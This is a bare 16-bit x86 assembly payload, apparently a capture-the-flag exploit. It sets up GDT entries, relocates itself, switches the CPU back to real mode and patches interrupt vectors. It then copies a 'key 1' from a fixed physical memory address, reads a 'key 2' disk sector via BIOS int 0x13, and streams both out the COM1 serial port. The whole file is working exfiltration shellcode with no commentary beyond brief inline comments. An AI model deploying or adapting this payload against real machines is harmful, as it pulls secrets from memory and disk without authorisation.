BITS 16
Start:

;first, expand the gdt entry
mov [0], word 0xffff
lgdt [0]

;ss and ds are 0, create a gdt entry to allow us to easily move data around as changing es will cause trouble at the moment
mov [0x7000], word 0xffff
mov [0x7002], word 0
mov [0x7004], word 0x9b07
mov [0x7006], word 0
mov [0x7008], word 0xffff
mov [0x700a], word 0
mov [0x700c], word 0x9307
mov [0x700e], word 0

mov [0x7010], word 0xffff
mov [0x7012], word 0
mov [0x7014], word 0x9313
mov [0x7016], word 0

;copy ourselves to lower memory
mov cx, CopyEnd - CopyStart
mov ax, cs
mov ds, ax
mov di, 0

call GetIP
GetIP:
pop si
add si, CopyStart - GetIP
push si
push cx

;copy ourselves to 0x7000
mov ax, 0x7008
mov es, ax

mov ax, cs
mov ds, ax

rep movsb

;fix ds functionality
mov ax, es
mov ds, ax

;key 1 is at 0x11ea40 physical memory, 0x137a40 linear
;copy it to a location we can use, 0x78000 physical
mov ax, 0x7010
mov ds, ax
mov ax, 0x7008
mov es, ax
mov si, 0x7a40
mov di, 0x8000
mov cx, 512
rep movsb

jmp far 0x7000:0x0000

CopyStart:

mov eax, 0x00000030
mov cr0, eax

;in real mode
mov ax, 0
mov es, ax
mov ds, ax
mov ss, ax

;fix our interrupts quickly
mov cx, 0x200
mov al, 0
mov di, 0
rep stosw

;setup 0x0 to be iret
mov [0], byte 0xcf

;fix int 0x13
mov [0x4c], dword 0xf000e3fe

;fix int 0x41, hd0 data
mov [0x104], dword 0x9fc0003d

;call int 0x13, func 0x42
;read 512 bytes from the hd starting at 0x57000
mov ah, 0x42
mov dl, 0x80
mov si, 0x100
mov [si], word 0x0010
mov [si+2], word 1
mov [si+4], dword 0x80000000
mov [si+8], dword 0x2b8
mov [si+12], dword 0
int 0x13

;do loop to send key 1
mov ax, 0x7000
mov es, ax
mov ds, ax
mov si, 0x8000
xchg bx, bx
call SendDataLoop

;do loop to send key 2
mov ax, 0x8000
mov es, ax
mov ds, ax
xor si, si
call SendDataLoop

InfLoop:
;indicate we are done transferring
mov dx, 0x3f8+1
in al, dx
and al, 0xFD
out dx, al

;loop forever
cli
jmp InfLoop

SendDataLoop:
mov dx, 0x3f8+5
in al, dx

and al, 0x20
jz SendDataLoop

;able to send a byte
lodsb

;send byte
mov dx, 0x3f8
out dx, al	

xchg ax, cx

;indicate data exists
mov dx, 0x3f8+1
in al, dx
or al, 2
out dx, al

;if empty then stop sending
cmp cl, 0
jnz SendDataLoop
ret

CopyEnd:

